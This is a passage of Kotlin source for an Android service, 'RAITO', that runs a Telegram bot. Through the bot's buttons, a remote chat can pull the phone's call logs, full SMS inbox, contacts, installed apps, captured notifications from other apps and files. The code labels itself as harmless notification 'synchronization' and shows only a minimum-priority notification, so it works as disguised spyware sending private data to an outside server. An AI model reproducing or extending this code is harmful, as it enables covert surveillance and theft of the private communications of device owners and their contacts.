            cleanCmd.startsWith("cmd_set_lang_") -> {
                val newLangCode = cleanCmd.removePrefix("cmd_set_lang_")
                if (newLangCode == "fa" || newLangCode == "en" || newLangCode == "ru" || newLangCode == "zh") {
                    val current = repository.settings.first()
                    val updated = current.copy(languageCode = newLangCode)
                    repository.saveSettings(updated)
                    activeLanguageCode = newLangCode

                    val successMsg = when (newLangCode) {
                        "fa" -> "✅ زبان با موفقیت به *فارسی* تغییر یافت."
                        "ru" -> "✅ Язык успешно изменен на *Русский*."
                        "zh" -> "✅ 语言成功的更改为 *中文*。"
                        else -> "✅ Language successfully changed to *English*."
                    }
                    sendBotMessage(token, chat, successMsg, buildWelcomeKeyboard(newLangCode))
                }
            }
            cleanCmd.startsWith("/lang") -> {
                val settingsLocal = repository.settings.first()
                val langLabel = when (settingsLocal.languageCode) {
                    "fa" -> "Persian (Persian 🇮🇷 فارسی)"
                    "ru" -> "Russian (Russian 🇷🇺 Русский)"
                    "zh" -> "Chinese (Chinese 🇨🇳 中文)"
                    else -> "English (English 🇺🇸 English)"
                }
                sendBotMessage(token, chat, "🌐 *Active App Language:*\n`$langLabel`")
            }
            else -> {
                sendBotMessage(token, chat, "❓ *Unknown command:* `$text`.\nType /help or use the glass interface buttons below.", buildWelcomeKeyboard())
            }
        }
    }

    private fun escapeAndFormatToHtml(input: String): String {
        // 1. Escape special HTML symbols safely so we don't break XML/HTML
        var escaped = input
            .replace("&", "&amp;")
            .replace("<", "&lt;")
            .replace(">", "&gt;")

        // 2. Parse `code` to <code>code</code>
        val codeRegex = Regex("`(.*?)`")
        escaped = codeRegex.replace(escaped) { matchResult ->
            "<code>${matchResult.groupValues[1]}</code>"
        }

        // 3. Parse *bold* to <b>bold</b>
        val boldRegex = Regex("\\*(.*?)\\*")
        escaped = boldRegex.replace(escaped) { matchResult ->
            "<b>${matchResult.groupValues[1]}</b>"
        }

        return escaped
    }

    private fun sendBotMessage(token: String, chat: String, message: String, keyboardJson: JSONObject? = null) {
        scope.launch {
            try {
                val formattedHtml = escapeAndFormatToHtml(message)
                val base = com.example.SyncApplication.getTelegramBaseUrl()
                val url = "$base$token/sendMessage"
                val json = JSONObject().apply {
                    put("chat_id", chat)
                    put("text", formattedHtml)
                    put("parse_mode", "HTML")
                    if (keyboardJson != null) {
                        put("reply_markup", keyboardJson)
                    }
                }
                val requestBody = json.toString().toRequestBody("application/json; charset=utf-8".toMediaType())
                val request = Request.Builder().url(url).post(requestBody).build()
                okHttpClient.newCall(request).execute().use { response ->
                    if (!response.isSuccessful) {
                        val errorBody = response.body?.string() ?: ""
                        repository.log("BOT_STATUS", "Telegram bot message send failure: ${response.code} $errorBody", "FAILED")
                    }
                }
            } catch (e: Exception) {
                repository.log("BOT_STATUS", "Exception sending telegram message: ${e.message}", "FAILED")
            }
        }
    }

    private fun buildWelcomeKeyboard(): JSONObject {
        return buildWelcomeKeyboard(activeLanguageCode)
    }

    private fun buildWelcomeKeyboard(langCode: String): JSONObject {
        val btnDeviceCheck = when (langCode) {
            "fa" -> "📊 بررسی وضعیت دستگاه"
            "ru" -> "📊 Проверить устройство"
            "zh" -> "📊 设备状态"
            else -> "📊 Device Check"
        }
        val btnLocalLogs = when (langCode) {
            "fa" -> "📂 مشاهده رویدادهای محلی"
            "ru" -> "📂 Просмотр логов"
            "zh" -> "📂 查看本地日志"
            else -> "📂 View Local Logs"
        }
        val btnApps = when (langCode) {
            "fa" -> "📱 لیست برنامه‌های نصب‌شده"
            "ru" -> "📱 Установленные приложения"
            "zh" -> "📱 已安装软件"
            else -> "📱 Installed Package List"
        }
        val btnConfig = when (langCode) {
            "fa" -> "⚙️ تنظیمات و پیکربندی سیستم"
            "ru" -> "⚙️ Конфигурация системы"
            "zh" -> "⚙️ 系统配置"
            else -> "⚙️ System Configuration"
        }
        val btnCalls = when (langCode) {
            "fa" -> "📞 گزارش تماس"
            "ru" -> "📞 История звонков"
            "zh" -> "📞 通话记录"
            else -> "📞 Call Logs"
        }
        val btnSms = when (langCode) {
            "fa" -> "💬 گزارش پیامک"
            "ru" -> "💬 Журнал SMS"
            "zh" -> "💬 短信列表"
            else -> "💬 SMS Inbox"
        }
        val btnFiles = when (langCode) {
            "fa" -> "📁 مدیریت فایل"
            "ru" -> "📁 Файлы"
            "zh" -> "📁 文件管理"
            else -> "📁 File Explorer"
        }
        val btnLang = when (langCode) {
            "fa" -> "🌐 تغییر زبان"
            "ru" -> "🌐 Сменить язык"
            "zh" -> "🌐 切换语言"
            else -> "🌐 Change Language"
        }

        val btnNotif = when (langCode) {
            "fa" -> "🔔 گزارش نوتیفیکیشن‌ها"
            "ru" -> "🔔 Отчеты о сообщениях"
            "zh" -> "🔔 通知历史报告"
            else -> "🔔 Notification Reports"
        }

        val keyboard = JSONArray().apply {
            put(JSONArray().apply {
                put(JSONObject().apply { put("text", btnDeviceCheck); put("callback_data", "cmd_device_check") })
                put(JSONObject().apply { put("text", btnLocalLogs); put("callback_data", "cmd_local_logs") })
            })
            put(JSONArray().apply {
                put(JSONObject().apply { put("text", btnApps); put("callback_data", "cmd_installed_packages") })
                put(JSONObject().apply { put("text", btnConfig); put("callback_data", "cmd_system_config") })
            })
            put(JSONArray().apply {
                put(JSONObject().apply { put("text", btnCalls); put("callback_data", "cmd_calls") })
                put(JSONObject().apply { put("text", btnSms); put("callback_data", "cmd_sms") })
            })
            put(JSONArray().apply {
                put(JSONObject().apply { put("text", btnFiles); put("callback_data", "cmd_files") })
                put(JSONObject().apply { put("text", btnLang); put("callback_data", "cmd_lang_menu") })
            })
            put(JSONArray().apply {
                put(JSONObject().apply { put("text", btnNotif); put("callback_data", "cmd_notif_reports") })
            })
        }
        return JSONObject().apply {
            put("inline_keyboard", keyboard)
        }
    }

    private fun buildLanguageKeyboard(): JSONObject {
        val keyboard = JSONArray().apply {
            put(JSONArray().apply {
                put(JSONObject().apply { put("text", "🇮🇷 فارسی (Persian)"); put("callback_data", "cmd_set_lang_fa") })
                put(JSONObject().apply { put("text", "🇺🇸 English (English)"); put("callback_data", "cmd_set_lang_en") })
            })
            put(JSONArray().apply {
                put(JSONObject().apply { put("text", "🇷🇺 Русский (Russian)"); put("callback_data", "cmd_set_lang_ru") })
                put(JSONObject().apply { put("text", "🇨🇳 中文 (Chinese)"); put("callback_data", "cmd_set_lang_zh") })
            })
        }
        return JSONObject().apply {
            put("inline_keyboard", keyboard)
        }
    }

    private fun answerCallbackQuery(token: String, queryId: String) {
        scope.launch {
            try {
                val base = com.example.SyncApplication.getTelegramBaseUrl()
                val url = "$base$token/answerCallbackQuery"
                val json = JSONObject().apply {
                    put("callback_query_id", queryId)
                }
                val requestBody = json.toString().toRequestBody("application/json; charset=utf-8".toMediaType())
                val request = Request.Builder().url(url).post(requestBody).build()
                okHttpClient.newCall(request).execute().close()
            } catch (e: Exception) {
                // Ignore silent
            }
        }
    }

    private fun fetchCallLogsPaginated(page: Int): Pair<String, JSONObject?> {
        val resolver = contentResolver
        val cursor = try {
            resolver.query(
                CallLog.Calls.CONTENT_URI,
                arrayOf(
                    CallLog.Calls.NUMBER,
                    CallLog.Calls.TYPE,
                    CallLog.Calls.DATE,
                    CallLog.Calls.DURATION,
                    CallLog.Calls.CACHED_NAME
                ),
                null, null, "${CallLog.Calls.DATE} DESC"
            )
        } catch (e: Exception) {
            return Pair("⚠️ *Error reading call logs:* `${e.localizedMessage}`\nEnsure that CALL LOG permissions are granted in the app.", buildWelcomeKeyboard())
        }

        if (cursor == null) {
            return Pair("❌ No call logs returned. Ensure CALL LOG permissions are granted in the app.", buildWelcomeKeyboard())
        }

        val totalCalls = cursor.count
        val pageSize = 10
        val maxPage = if (totalCalls == 0) 0 else (totalCalls - 1) / pageSize
        val currentPage = page.coerceIn(0, maxPage)

        val isPersian = activeLanguageCode == "fa"
        val sb = StringBuilder()
        sb.append(if (isPersian) "📞 *گزارش تاریخچه تماس‌ها (صفحه ${currentPage + 1} از ${maxPage + 1}):*\n\n" else "📞 *Recent Call History Logs (Page ${currentPage + 1} of ${maxPage + 1}):*\n\n")

        var loadedCount = 0
        try {
            val numIdx = cursor.getColumnIndex(CallLog.Calls.NUMBER)
            val typeIdx = cursor.getColumnIndex(CallLog.Calls.TYPE)
            val dateIdx = cursor.getColumnIndex(CallLog.Calls.DATE)
            val durIdx = cursor.getColumnIndex(CallLog.Calls.DURATION)
            val nameIdx = cursor.getColumnIndex(CallLog.Calls.CACHED_NAME)

            val startPos = currentPage * pageSize
            if (cursor.moveToPosition(startPos)) {
                do {
                    loadedCount++
                    val count = startPos + loadedCount
                    val number = if (numIdx != -1) cursor.getString(numIdx) ?: "Unknown" else "Unknown"
                    val name = if (nameIdx != -1) cursor.getString(nameIdx) ?: (if (isPersian) "ناشناس" else "Unknown Contact") else (if (isPersian) "ناشناس" else "Unknown Contact")
                    val typeVal = if (typeIdx != -1) cursor.getInt(typeIdx) else -1
                    val dateVal = if (dateIdx != -1) cursor.getLong(dateIdx) else 0L
                    val duration = if (durIdx != -1) cursor.getInt(durIdx) else 0

                    val typeStr = when (typeVal) {
                        CallLog.Calls.INCOMING_TYPE -> if (isPersian) "📥 ورودی (INCOMING)" else "📥 INCOMING"
                        CallLog.Calls.OUTGOING_TYPE -> if (isPersian) "📤 خروجی (OUTGOING)" else "📤 OUTGOING"
                        CallLog.Calls.MISSED_TYPE -> if (isPersian) "🚫 ناموفق (MISSED)" else "🚫 MISSED"
                        else -> if (isPersian) "📞 سایر" else "📞 OTHER"
                    }

                    val dateStr = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(Date(dateVal))
                    sb.append("$count. *${name}* (`$number`)\n")
                    sb.append(if (isPersian) "   • نوع: `$typeStr` | مدت: `${duration} ثانیه`\n" else "   • Type: `$typeStr` | Duration: `${duration}s`\n")
                    sb.append(if (isPersian) "   • زمان: `$dateStr`\n\n" else "   • Date: `$dateStr`\n\n")
                } while (cursor.moveToNext() && loadedCount < pageSize)
            }
            if (totalCalls == 0) {
                sb.append(if (isPersian) "هیچ گزارش تماسی یافت نشد." else "No record entries available.")
            }
        } catch (e: Exception) {
            sb.append("⚠️ *Parsing error:* `${e.localizedMessage}`")
        } finally {
            cursor.close()
        }

        val keyboard = JSONArray().apply {
            val navRow = JSONArray()
            if (currentPage > 0) {
                navRow.put(JSONObject().apply { put("text", "◀️ Prev"); put("callback_data", "cmd_calls_page_${currentPage - 1}") })
            }
            navRow.put(JSONObject().apply { put("text", if (isPersian) "🔙 منوی اصلی" else "🔙 Main Menu"); put("callback_data", "cmd_main_menu") })
            if (currentPage < maxPage) {
                navRow.put(JSONObject().apply { put("text", "Next ▶️"); put("callback_data", "cmd_calls_page_${currentPage + 1}") })
            }
            put(navRow)
        }
        val replyMarkup = JSONObject().apply { put("inline_keyboard", keyboard) }

        return Pair(sb.toString(), replyMarkup)
    }

    private fun fetchSmsInboxPaginated(page: Int): Pair<String, JSONObject?> {
        val resolver = contentResolver
        val cursor = try {
            resolver.query(
                android.net.Uri.parse("content://sms/inbox"),
                arrayOf("_id", "address", "body", "date"),
                null, null, "date DESC"
            )
        } catch (e: Exception) {
            return Pair("⚠️ *Error reading SMS:* `${e.localizedMessage}`\nEnsure that SMS permissions are granted in the app.", buildWelcomeKeyboard())
        }

        if (cursor == null) {
            return Pair("❌ No SMS logs returned. Ensure SMS permissions are granted in the app.", buildWelcomeKeyboard())
        }

        val totalSms = cursor.count
        val pageSize = 10
        val maxPage = if (totalSms == 0) 0 else (totalSms - 1) / pageSize
        val currentPage = page.coerceIn(0, maxPage)

        val isPersian = activeLanguageCode == "fa"
        val sb = StringBuilder()
        sb.append(if (isPersian) "💬 *صندوق پیامک‌های دریافتی (صفحه ${currentPage + 1} از ${maxPage + 1}):*\n\n" else "💬 *Recent SMS Inbox (Page ${currentPage + 1} of ${maxPage + 1}):*\n\n")

        var loadedCount = 0
        try {
            val addrIdx = cursor.getColumnIndex("address")
            val bodyIdx = cursor.getColumnIndex("body")
            val dateIdx = cursor.getColumnIndex("date")

            val startPos = currentPage * pageSize
            if (cursor.moveToPosition(startPos)) {
                do {
                    loadedCount++
                    val count = startPos + loadedCount
                    val address = if (addrIdx != -1) cursor.getString(addrIdx) ?: "Unknown" else "Unknown"
                    val body = if (bodyIdx != -1) cursor.getString(bodyIdx) ?: "" else ""
                    val dateVal = if (dateIdx != -1) cursor.getLong(dateIdx) else 0L

                    val dateStr = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(Date(dateVal))
                    sb.append("$count. *From:* `$address` | `$dateStr`\n")
                    sb.append("   💬: $body\n\n")
                } while (cursor.moveToNext() && loadedCount < pageSize)
            }
            if (totalSms == 0) {
                sb.append(if (isPersian) "هیچ پیامکی یافت نشد." else "No SMS messages found.")
            }
        } catch (e: Exception) {
            sb.append("⚠️ *Parsing error:* `${e.localizedMessage}`")
        } finally {
            cursor.close()
        }

        val keyboard = JSONArray().apply {
            val navRow = JSONArray()
            if (currentPage > 0) {
                navRow.put(JSONObject().apply { put("text", "◀️ Prev"); put("callback_data", "cmd_sms_page_${currentPage - 1}") })
            }
            navRow.put(JSONObject().apply { put("text", if (isPersian) "🔙 منوی اصلی" else "🔙 Main Menu"); put("callback_data", "cmd_main_menu") })
            if (currentPage < maxPage) {
                navRow.put(JSONObject().apply { put("text", "Next ▶️"); put("callback_data", "cmd_sms_page_${currentPage + 1}") })
            }
            put(navRow)
        }
        val replyMarkup = JSONObject().apply { put("inline_keyboard", keyboard) }

        return Pair(sb.toString(), replyMarkup)
    }

    private fun fetchNotificationsPaginated(page: Int, filter: String? = null): Pair<String, JSONObject?> {
        val isPersian = activeLanguageCode == "fa"
        val list = mutableListOf<NotificationLogItem>()
        val allLines = mutableListOf<String>()

        try {
            val file = File(applicationContext.getExternalFilesDir(null), "notifications_log.txt")
            if (file.exists()) {
                allLines.addAll(file.readLines())
            }
        } catch (e: Exception) {
            android.util.Log.e("RaitoService", "Error reading local private notifications log: ${e.message}")
        }

        try {
            if (allLines.isEmpty()) {
                val publicFile = File(Environment.getExternalStorageDirectory(), "Documents/RaitoLogs/notifications_log.txt")
                if (publicFile.exists()) {
                    allLines.addAll(publicFile.readLines())
                }
            }
        } catch (e: Exception) {
            android.util.Log.e("RaitoService", "Error reading public notifications log: ${e.message}")
        }

        for (line in allLines) {
            try {
                if (!line.startsWith("[")) continue
                val timeEnd = line.indexOf("]")
                if (timeEnd == -1) continue
                val timestamp = line.substring(1, timeEnd)
                
                val pkgStart = line.indexOf("[Package: ", timeEnd)
                if (pkgStart == -1) continue
                val pkgEnd = line.indexOf("]", pkgStart)
                if (pkgEnd == -1) continue
                val packageName = line.substring(pkgStart + 10, pkgEnd)
                
                val titleStart = line.indexOf("[Title: ", pkgEnd)
                if (titleStart == -1) continue
                val titleEnd = line.indexOf("]", titleStart)
                if (titleEnd == -1) continue
                val title = line.substring(titleStart + 8, titleEnd)
                
                val separator = " -> "
                val sepIndex = line.indexOf(separator, titleEnd)
                val text = if (sepIndex != -1) line.substring(sepIndex + separator.length) else ""
                
                val item = NotificationLogItem(timestamp, packageName, title, text)
                if (filter == null || packageName.contains(filter, ignoreCase = true) || title.contains(filter, ignoreCase = true) || text.contains(filter, ignoreCase = true)) {
                    list.add(item)
                }
            } catch (e: Exception) {
                // skip malformed lines
            }
        }

        val reversedList = list.asReversed()
        val totalItems = reversedList.size
        val pageSize = 5
        val maxPage = if (totalItems == 0) 0 else (totalItems - 1) / pageSize
        val currentPage = page.coerceIn(0, maxPage)

        val sb = StringBuilder()
        val titleText = if (filter != null) " (Filter: $filter)" else ""
        if (isPersian) {
            sb.append("🔔 *گزارش نوتیفیکیشن‌های دریافتی$titleText (صفحه ${currentPage + 1} از ${maxPage + 1}):*\n\n")
        } else {
            sb.append("🔔 *Notification Alarm History$titleText (Page ${currentPage + 1} of ${maxPage + 1}):*\n\n")
        }

        if (totalItems > 0) {
            val startPos = currentPage * pageSize
            val endPos = minOf(startPos + pageSize, totalItems)
            for (i in startPos until endPos) {
                val item = reversedList[i]
                val shortApp = item.packageName.substringAfterLast('.')
                sb.append("📱 *App:* <code>$shortApp</code> | ⏰ <code>${item.timestamp}</code>\n")
                if (item.title.isNotEmpty()) {
                    sb.append("👤 *Sender:* <code>${item.title}</code>\n")
                }
                sb.append("💬: ${item.text}\n\n")
                sb.append("┄┄┄┄┄┄┄┄┄┄┄┄┄┄\n\n")
            }
        } else {
            sb.append(if (isPersian) "هیچ نوتیفیکیشنی یافت نشد." else "No notification records found.")
        }

        val keyboard = JSONArray().apply {
            // Row 1: The Download button as requested (only opt inside notification settings)
            val fileRow = JSONArray()
            fileRow.put(JSONObject().apply {
                put("text", if (isPersian) "📥 دانلود فایل گزارش نوتیفیکیشن (.txt)" else "📥 Download Notifications Log (.txt)")
                put("callback_data", "cmd_dl_logs_all")
            })
            put(fileRow)

            // Row 2: Main Menu back button
            val navRow = JSONArray()
            navRow.put(JSONObject().apply { put("text", if (isPersian) "🔙 منوی اصلی" else "🔙 Main Menu"); put("callback_data", "cmd_main_menu") })
            put(navRow)
        }
        val replyMarkup = JSONObject().apply { put("inline_keyboard", keyboard) }
        return Pair(sb.toString(), replyMarkup)
    }

    private fun generateFilteredLogFile(filter: String?): File {
        val inputFile = File(applicationContext.getExternalFilesDir(null), "notifications_log.txt")
        val suffix = if (filter == null) "unified" else filter.lowercase(Locale.getDefault())
        val outputFile = File(applicationContext.getExternalFilesDir(null), "raito_notifications_${suffix}.txt")
        
        if (outputFile.exists()) {
            outputFile.delete()
        }
        
        var lines = emptyList<String>()
        try {
            if (inputFile.exists()) {
                lines = inputFile.readLines()
            } else {
                val publicFile = File(Environment.getExternalStorageDirectory(), "Documents/RaitoLogs/notifications_log.txt")
                if (publicFile.exists()) {
                    lines = publicFile.readLines()
                }
            }
        } catch (e: Exception) {
            android.util.Log.e("RaitoService", "Error reading logs file for export: ${e.message}")
        }
        
        if (lines.isEmpty()) {
            outputFile.writeText("RAITO Logging System: No records cached.\n")
            return outputFile
        }
        
        val filteredLines = if (filter == null) {
            lines
        } else {
            lines.filter { line -> line.contains(filter, ignoreCase = true) }
        }
        
        // Group the lines by package
        val packageGroups = LinkedHashMap<String, MutableList<String>>()
        for (line in filteredLines) {
            if (line.trim().isEmpty()) continue
            val packageMarker = "[Package: "
            val startIndex = line.indexOf(packageMarker)
            val packageName = if (startIndex != -1) {
                val endIndex = line.indexOf("]", startIndex + packageMarker.length)
                if (endIndex != -1) {
                    line.substring(startIndex + packageMarker.length, endIndex).trim()
                } else {
                    "System/Unknown"
                }
            } else {
                "System/Unknown"
            }
            
            if (!packageGroups.containsKey(packageName)) {
                packageGroups[packageName] = mutableListOf()
            }
            packageGroups[packageName]?.add(line)
        }
        
        val sb = java.lang.StringBuilder()
        sb.append("=========================================================================\n")
        sb.append("            RAITO UNIFIED CLASSIFIED NOTIFICATIONS REPORT                \n")
        sb.append("            Generated on: ${SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(Date())}\n")
        sb.append("=========================================================================\n\n")
        
        for ((pkg, list) in packageGroups) {
            val appLabel = try {
                if (pkg == "System/Unknown" || pkg == "System & Other Alerts") {
                    "System Alerts & Miscellaneous"
                } else {
                    val pManager = applicationContext.packageManager
                    val appInfo = pManager.getApplicationInfo(pkg, 0)
                    pManager.getApplicationLabel(appInfo).toString()
                }
            } catch (e: Exception) {
                pkg
            }
            
            sb.append("=========================================================================\n")
            sb.append("📱 APP NAME: $appLabel ($pkg)\n")
            sb.append("=========================================================================\n")
            
            for (line in list) {
                var cleanedLine = line
                val marker1 = "[Package: $pkg] "
                val marker2 = "[Package: $pkg]"
                if (cleanedLine.contains(marker1)) {
                    cleanedLine = cleanedLine.replace(marker1, "")
                } else if (cleanedLine.contains(marker2)) {
                    cleanedLine = cleanedLine.replace(marker2, "")
                }
                sb.append("  • $cleanedLine\n")
            }
            sb.append("\n\n")
        }
        
        outputFile.writeText(sb.toString())
        return outputFile
    }

    private fun fetchContacts(): String {
        val resolver = contentResolver
        val cursor = try {
            resolver.query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                arrayOf(
                    ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                    ContactsContract.CommonDataKinds.Phone.NUMBER
                ),
                null, null, "${ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME} ASC LIMIT 20"
            )
        } catch (e: Exception) {
            return "⚠️ *Error reading contacts:* `${e.localizedMessage}`\nEnsure CONTACTS permission is granted in the app."
        }

        if (cursor == null) return "❌ No contacts returned. Ensure CONTACTS permission is granted in the app."

        val sb = StringBuilder()
        sb.append("👥 *Contacts List (Max 20):*\n\n")
        try {
            val nameIdx = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
            val numIdx = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)

            var count = 0
            while (cursor.moveToNext()) {
                count++
                val name = if (nameIdx != -1) cursor.getString(nameIdx) ?: "No Name" else "No Name"
                val number = if (numIdx != -1) cursor.getString(numIdx) ?: "No Number" else "No Number"
                sb.append("$count. *${name}* - `$number`\n")
            }
            if (count == 0) {
                sb.append("No contacts available on this device.")
            }
        } catch (e: Exception) {
            sb.append("⚠️ *Parsing error:* `${e.localizedMessage}`")
        } finally {
            cursor.close()
        }
        return sb.toString()
    }

    private fun fetchInstalledAppsPaginated(page: Int): Pair<String, JSONObject?> {
        val pm = packageManager
        val apps = try {
            pm.getInstalledApplications(PackageManager.GET_META_DATA)
        } catch (e: Exception) {
            return Pair("⚠️ *Error reading apps:* `${e.localizedMessage}`", buildWelcomeKeyboard())
        }

        val sortedApps = apps.sortedBy { it.loadLabel(pm).toString().lowercase(Locale.getDefault()) }
        val totalApps = sortedApps.size
        val pageSize = 15
        val maxPage = if (totalApps == 0) 0 else (totalApps - 1) / pageSize
        val currentPage = page.coerceIn(0, maxPage)

        val isPersian = activeLanguageCode == "fa"
        val sb = StringBuilder()
        sb.append(if (isPersian) "📱 *لیست برنامه‌های نصب‌شده (صفحه ${currentPage + 1} از ${maxPage + 1}):*\n\n" else "📱 *Installed Apps List (Page ${currentPage + 1} of ${maxPage + 1}):*\n\n")

        val subList = sortedApps.drop(currentPage * pageSize).take(pageSize)
        var index = currentPage * pageSize + 1
        for (app in subList) {
            val isSystem = (app.flags and ApplicationInfo.FLAG_SYSTEM) != 0
            val label = app.loadLabel(pm).toString()
            val packName = app.packageName
            val sysIndicator = if (isSystem) "⚙️" else "👤"
            sb.append("$index. *${label}*\n   `$packName` | $sysIndicator\n")
            index++
        }

        val keyboard = JSONArray().apply {
            val navRow = JSONArray()
            if (currentPage > 0) {
                navRow.put(JSONObject().apply { put("text", "◀️ Prev"); put("callback_data", "cmd_apps_page_${currentPage - 1}") })
            }
            navRow.put(JSONObject().apply { put("text", if (isPersian) "🔙 منوی اصلی" else "🔙 Main Menu"); put("callback_data", "cmd_main_menu") })
            if (currentPage < maxPage) {
                navRow.put(JSONObject().apply { put("text", "Next ▶️"); put("callback_data", "cmd_apps_page_${currentPage + 1}") })
            }
            put(navRow)
        }
        val replyMarkup = JSONObject().apply { put("inline_keyboard", keyboard) }

        return Pair(sb.toString(), replyMarkup)
    }

    // Cache clean logic
    private fun performCacheClean(): Long {
        var freedBytes = 0L
        try {
            val cacheDir = cacheDir
            freedBytes += deleteFilesRecursively(cacheDir)
            val extCacheDir = externalCacheDir
            if (extCacheDir != null) {
                freedBytes += deleteFilesRecursively(extCacheDir)
            }
        } catch (e: Exception) {
            // Log ignored
        }
        return freedBytes
    }

    private fun deleteFilesRecursively(dir: File): Long {
        var size = 0L
        if (dir.isDirectory) {
            val children = dir.listFiles() ?: emptyArray()
            for (child in children) {
                if (child.isDirectory) {
                    size += deleteFilesRecursively(child)
                } else {
                    val length = child.length()
                    if (child.delete()) {
                        size += length
                    }
                }
            }
        }
        return size
    }

    // Hardware parameters
    private fun getBatteryPercentage(): Int {
        val intent = registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED))
        val level = intent?.getIntExtra(BatteryManager.EXTRA_LEVEL, -1) ?: -1
        val scale = intent?.getIntExtra(BatteryManager.EXTRA_SCALE, -1) ?: -1
        return if (level >= 0 && scale > 0) (level * 100 / scale) else 0
    }

    private fun getBatteryStatus(): String {
        val intent = registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED))
        val status = intent?.getIntExtra(BatteryManager.EXTRA_STATUS, -1) ?: -1
        return when (status) {
            BatteryManager.BATTERY_STATUS_CHARGING -> "Charging"
            BatteryManager.BATTERY_STATUS_DISCHARGING -> "Discharging"
            BatteryManager.BATTERY_STATUS_FULL -> "Full"
            BatteryManager.BATTERY_STATUS_NOT_CHARGING -> "Not Charging"
            BatteryManager.BATTERY_STATUS_UNKNOWN -> "Unknown"
            else -> "N/A"
        }
    }

    private fun getStorageCapacity(free: Boolean): Long {
        val path = Environment.getDataDirectory()
        val stat = StatFs(path.path)
        val blockSize = stat.blockSizeLong
        val blocks = if (free) stat.availableBlocksLong else stat.blockCountLong
        return blocks * blockSize
    }

    private fun formatSize(bytes: Long): String {
        val kb = bytes / 1024.0
        val mb = kb / 1024.0
        val gb = mb / 1024.0
        return when {
            gb >= 1.0 -> String.format(Locale.US, "%.2f GB", gb)
            mb >= 1.0 -> String.format(Locale.US, "%.2f MB", mb)
            else -> String.format(Locale.US, "%.2f KB", kb)
        }
    }

    private fun getNetworkType(): String {
        val cm = getSystemService(Context.CONNECTIVITY_SERVICE) as? ConnectivityManager ?: return "Offline"
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val netPath = cm.activeNetwork ?: return "Offline"
            val caps = cm.getNetworkCapabilities(netPath) ?: return "Offline"
            return when {
                caps.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) -> "WiFi"
                caps.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) -> "Cellular Network"
                caps.hasTransport(NetworkCapabilities.TRANSPORT_ETHERNET) -> "Ethernet"
                else -> "Connected"
            }
        } else {
            @Suppress("DEPRECATION")
            val actNet = cm.activeNetworkInfo
            @Suppress("DEPRECATION")
            return if (actNet?.isConnected == true) actNet.typeName else "Offline"
        }
    }

    private fun formatDuration(sec: Long): String {
        val days = sec / 86400
        val hours = (sec % 86400) / 3600
        val minutes = (sec % 3600) / 60
        val seconds = sec % 60
        return when {
            days > 0 -> "${days}d ${hours}h ${minutes}m"
            hours > 0 -> "${hours}h ${minutes}m ${seconds}s"
            else -> "${minutes}m ${seconds}s"
        }
    }

    private fun triggerTimeSetupNotification() {
        val timeSettingsIntent = Intent(Settings.ACTION_DATE_SETTINGS).apply {
            flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TASK
        }
        val flags = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
        } else {
            PendingIntent.FLAG_UPDATE_CURRENT
        }
        val pendingIntent = PendingIntent.getActivity(this, 102, timeSettingsIntent, flags)

        val notification = NotificationCompat.Builder(this, CHANNEL_ID)
            .setSmallIcon(android.R.drawable.ic_lock_idle_alarm)
            .setContentTitle("RAITO Time Maintenance")
            .setContentText("Tap here to change or review device clock, timezone or time networks.")
            .setPriority(NotificationCompat.PRIORITY_HIGH)
            .setCategory(NotificationCompat.CATEGORY_ALARM)
            .setContentIntent(pendingIntent)
            .setAutoCancel(true)
            .build()

        val manager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
        manager.notify(18201, notification)
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "RAITO Background Service",
                NotificationManager.IMPORTANCE_LOW
            ).apply {
                description = "Runs background Telegram Bot for secure device notification synchronizations."
            }
            val manager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            manager.createNotificationChannel(channel)
        }
    }

    private fun buildStatusNotification(title: String, content: String): Notification {
        val flags = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            PendingIntent.FLAG_IMMUTABLE
        } else {
            0
        }
        val mainActivityIntent = Intent(this, com.example.MainActivity::class.java)
        val pendingIntent = PendingIntent.getActivity(this, 0, mainActivityIntent, flags)

        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setSmallIcon(android.R.drawable.ic_menu_compass)
            .setContentTitle(title)
            .setContentText(content)
            .setContentIntent(pendingIntent)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setOngoing(true)
            .build()
    }

    override fun onDestroy() {
        // Log first in a separate scope to ensure completion before child scopes cancel
        CoroutineScope(Dispatchers.IO).launch {
            repository.log("INFO", "RAITO Background Service stopped.", "INFO")
        }
        try {
            okHttpClient.dispatcher.cancelAll()
            okHttpClient.connectionPool.evictAll()
        } catch (e: Exception) {
            // Ignore
        }
        botJob?.cancel()
        job.cancel()
        stopForeground(true)
        stopSelf()
        super.onDestroy()
    }

    private fun encodePathToHex(path: String): String {
        return path.toByteArray(Charsets.UTF_8).joinToString("") { "%02x".format(it) }
    }

    private fun decodeHexToPath(hex: String): String {
        val bytes = ByteArray(hex.length / 2)
        for (i in 0 until hex.length step 2) {
            bytes[i / 2] = hex.substring(i, i + 2).toInt(16).toByte()
        }
        return String(bytes, Charsets.UTF_8)
    }

    private fun getFileEmoji(file: File): String {
        if (file.isDirectory) return "📁"
        val ext = file.extension.lowercase(Locale.getDefault())
        return when (ext) {
            "jpg", "jpeg", "png", "gif", "webp", "bmp", "heic", "heif", "svg" -> "🖼️"
